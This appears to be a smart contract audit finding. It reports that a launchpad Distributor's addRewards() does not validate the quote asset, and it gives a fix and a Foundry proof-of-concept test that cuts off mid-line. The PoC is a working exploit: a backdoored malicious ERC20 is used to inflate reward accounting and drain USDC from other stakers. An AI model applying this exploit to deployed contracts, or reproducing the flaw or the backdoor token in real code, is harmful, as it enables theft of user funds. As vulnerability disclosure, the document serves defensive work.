      "body": "## Finding description and impact\n\n\nThe `addRewards()` function in the Distributor contract fails to validate that the `quoteAsset` parameter matches the stored `rs.quoteAsset` in the reward pool. This allows attackers to use any malicious token as the quote asset parameter.\n\n### Vulnerable Code Location\n\n```solidity\n// Distributor.sol lines 107-133\nfunction addRewards(address token0, address token1, uint128 amount0, uint128 amount1) external {\n    (address launchAsset, address quoteAsset, uint128 launchAssetAmount, uint128 quoteAssetAmount) =\n        (token0, token1, amount0, amount1);\n    RewardPoolData storage rs = RewardsTrackerStorage.getRewardPool(token0);\n\n    if (rs.quoteAsset == address(0)) {\n        rs = RewardsTrackerStorage.getRewardPool(token1);\n        if (rs.quoteAsset == address(0)) revert RewardsDoNotExist();\n        (launchAsset, quoteAsset, launchAssetAmount, quoteAssetAmount) = (token1, token0, amount1, amount0);\n    }\n   \n    \n    if (quoteAssetAmount > 0) {\n        rs.addQuoteRewards(launchAsset, quoteAsset, quoteAssetAmount);  // Uses parameter, not rs.quoteAsset\n        _increaseTotalPending(quoteAsset, quoteAssetAmount);\n        quoteAsset.safeTransferFrom(msg.sender, address(this), uint256(quoteAssetAmount));\n    }\n}\n```\n\n## Attack path\n* calls addRewards with a valid launch token and a malicious token \n* launch token amount = 0 and malicious token amount = millions of unit\n* The token get transferred in and the pending rewards amount is increased\n* this new invalid amount is used in the reward tracker this inflates the `accQuoteRewardPerShare` of the quotetoken\n* when claim rewards is called, the attacker is able to drain the contract off all USDC as their share is overvalued.\n\n`Note`: refer to the POC to understand better\n\n\n\n\n### Recommended Fix\n\n```solidity\nfunction addRewards(address token0, address token1, uint128 amount0, uint128 amount1) external {\n    // ... existing logic to determine launchAsset and rs ...\n    \n    // Add validation\n    require(quoteAsset == rs.quoteAsset, \"Quote asset mismatch\");\n    \n    // ... rest of function ...\n}\n```",
      "proofOfConcept": "```solidity\n\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport {IDistributor} from \"contracts/launchpad/interfaces/IDistributor.sol\";\nimport {Distributor} from \"contracts/launchpad/Distributor.sol\";\nimport {UserRewardData} from \"contracts/launchpad/libraries/RewardsTracker.sol\";\nimport {LaunchToken} from \"contracts/launchpad/LaunchToken.sol\";\nimport {ILaunchpad} from \"contracts/launchpad/interfaces/ILaunchpad.sol\";\nimport {Ownable} from \"solady/auth/Ownable.sol\";\nimport {MockERC20} from \"forge-std/mocks/MockERC20.sol\";\nimport {SafeTransferLib} from \"solady/utils/SafeTransferLib.sol\";\nimport \"forge-std/console.sol\";\nimport \"forge-std/Test.sol\";\n\n\n/**\n * @title MaliciousTokenRewardsInflationPOC\n * @dev Proof of Concept demonstrating how attackers can use malicious tokens to inflate rewards and steal legitimate quote tokens\n *\n * VULNERABILITY DESCRIPTION:\n * The addRewards() function fails to validate that the quoteAsset parameter matches the stored quoteAsset\n * in the reward pool. This allows attackers to use malicious tokens that can be minted/manipulated to\n * artificially inflate the accRewardsPerShare, then claim legitimate quote tokens based on inflated rewards.\n *\n * ATTACK SCENARIO:\n * 1. Multiple users stake tokens and legitimate USDC rewards are added\n * 2. Attacker checks their legitimate reward value \n * 3. Attacker deploys malicious token and adds massive \"rewards\" using it as quoteAsset parameter\n * 4. This inflates accQuoteRewardPerShare artificially\n * 5. Attacker immediately claims rewards, receiving legitimate USDC based on inflated calculation\n * 6. Attacker steals significantly more USDC than their fair share\n */\n\ncontract MaliciousERC20 is MockERC20 {\n    address public attacker;\n\n    constructor() {\n        attacker = msg.sender;\n    }\n\n    function mint(uint256 amount) external {\n        _mint(msg.sender, amount);\n    }\n\n    function withdrawFromContract(address target, uint256 amount) external {\n        // This simulates a backdoor in the token that allows the attacker to manipulate balances\n        uint256 targetBalance = _balanceOf[target];\n        if (targetBalance >= amount) {\n            // Force transfer from target to attacker\n            _balanceOf[target] = _sub(_balanceOf[target], amount);\n            _balanceOf[msg.sender] = _add(_balanceOf[msg.sender], amount);\n            emit Transfer(target, msg.sender, amount);\n        }\n    }\n}\n\ncontract PoCLaunchpad is Test {\n    /**\n     * PoC can utilize the following variables to access the relevant contracts:\n     * - factory: ERC1967Factory.sol \n     * - launchpad: Launchpad.sol\n     * - distributor: Distributor.sol\n     * - curve: SimpleBondingCurve.sol\n     * - launchpadLPVault: LaunchpadLPVault.sol\n     * - quoteToken: Quote token used in Launchpad system\n     * - uniV2Router: Uniswap V2 Router used in Launchpad system\n     */\n    \n    using SafeTransferLib for address;\n\n    Distributor d;\n\n    address launchpad;\n    address baseToken;\n    address quoteToken; // Legitimate USDC\n    address attacker;\n    address userB;\n    address userC;\n    \n    MaliciousERC20 public maliciousToken;\n    function setUp() public {\n        launchpad = vm.addr(uint256(keccak256(abi.encode(\"launchpad\"))));\n        vm.label(launchpad, \"LAUNCHPAD\");\n\n        d = new Distributor();\n        d.initialize(launchpad);\n\n        baseToken = address(new MockERC20());\n        MockERC20(baseToken).initialize(\"Launch Token\", \"LAUNCH\", 18);\n        \n        quoteToken = address(new MockERC20());\n        MockERC20(quoteToken).initialize(\"USDC\", \"USDC\", 6);\n\n        // Create malicious token that attacker controls\n        maliciousToken = new MaliciousERC20();\n        maliciousToken.initialize(\"Malicious Token\", \"EVIL\", 18);\n\n        // Fund the test contract with tokens\n        deal(baseToken, address(this), 10000 ether);\n        deal(quoteToken, address(this), 30000e6); // 30k USDC\n\n        attacker = vm.addr(uint256(keccak256(bytes(\"attacker\"))));\n        userB = vm.addr(uint256(keccak256(bytes(\"userB\"))));\n        userC = vm.addr(uint256(keccak256(bytes(\"userC\"))));\n\n        vm.label(attacker, \"ATTACKER\");\n        vm.label(userB, \"USER_B\");\n        vm.label(userC, \"USER_C\");\n    }\n\n    function test_submissionValidity() public {\n        // 1. Setup reward pool\n        vm.prank(launchpad);\n        d.createRewardsPair(baseToken, quoteToken);\n\n        // 2. Three users stake equal amounts (attacker gets 1/3 of shares)\n        vm.prank(launchpad);\n        d.increaseStake(baseToken, attacker, 1000e18);\n        \n        vm.prank(launchpad);\n        d.increaseStake(baseToken, userB, 1000e18);\n        \n        vm.prank(launchpad);\n        d.increaseStake(baseToken, userC, 1000e18);\n\n        // 3. Add legitimate USDC rewards (1000 USDC total)\n        quoteToken.safeApprove(address(d), 30000e6);\n        d.addRewards(baseToken, quoteToken, 0, 30000e6);\n\n        // 4. Check attacker's legitimate reward before attack\n        (uint256 pendingBaseBefore, uint256 pendingQuoteBefore) = d.getPendingRewards(baseToken, attacker);\n        \n        console.log(\"=== BEFORE ATTACK ===\");\n        console.log(\"Attacker's legitimate pending quote rewards:\", pendingQuoteBefore);\n        console.log(\"Attacker's shares: 1000e18 out of 3000e18 total (33.33%)\");\n        console.log(\"Expected fair share: ~333 USDC\");\n\n        // 5. ATTACK: Use malicious token to inflate rewards\n        console.log(\"\\n=== EXECUTING ATTACK ===\");\n        \n        // Give attacker ability to mint malicious tokens\n        vm.startPrank(attacker);\n        \n        // Mint massive amount of malicious tokens to inflate rewards\n        uint256 totalLegitimateRewards = 30000e6;\n        uint256 totalShares = 3000e18;\n        uint256 maliciousAmount = (totalLegitimateRewards * 3) - totalLegitimateRewards; \n// Making new available rewards 3x the total legitimate rewards so the attacker's 1/3 share becomes 100% of available rewards\n        maliciousToken.mint(maliciousAmount);\n        maliciousToken.approve(address(d), maliciousAmount);\n        \n        // VULNERABILITY: addRewards doesn't validate quoteAsset parameter\n        // Attacker passes malicious token as quoteAsset but the pool's actual quoteAsset is USDC\n        d.addRewards(baseToken, address(maliciousToken), 0, uint128(maliciousAmount));\n        \n        console.log(\"Added malicious rewards amount:\", maliciousAmount);\n        \n        // 6. Immediately claim rewards to steal legitimate USDC\n        uint256 usdcBefore = MockERC20(quoteToken).balanceOf(attacker);\n        d.claimRewards(baseToken);\n        uint256 usdcAfter = MockERC20(quoteToken).balanceOf(attacker);\n        \n        vm.stopPrank();\n\n        uint256 stolenUsdc = usdcAfter - usdcBefore;\n        \n        console.log(\"\\n=== ATTACK RESULTS ===\");\n        console.log(\"USDC stolen by attacker:\", stolenUsdc);\n        console.log(\"Legitimate pending rewards before attack:\", pendingQuoteBefore);\n        console.log(\"Multiplier of theft:\", stolenUsdc / pendingQuoteBefore);\n\n        // 7. Verify other users get nothing - should revert with ZeroShareClaim\n        vm.prank(userB);\n        vm.expectRevert(\"ClaimAmountExceedsTotalPendingRewards()\");\n        d.claimRewards(baseToken);\n        \n        vm.prank(userC);\n        vm.expectRevert(\"ClaimAmountExceedsTotalPendingRewards()\");\n        d.claimRewards(baseToken);\n\n        // 8. Assertions to prove the attack\n        assertEq(stolenUsdc, pendingQuoteBefore * 3, \"Attacker should steal much more than fair share\");\n        \n        // Verify most/all of the legitimate USDC was stolen\n        uint256 totalUsdcInDistributor = MockERC20(quoteToken).balanceOf(address(d));\n        assertEq(totalUsdcInDist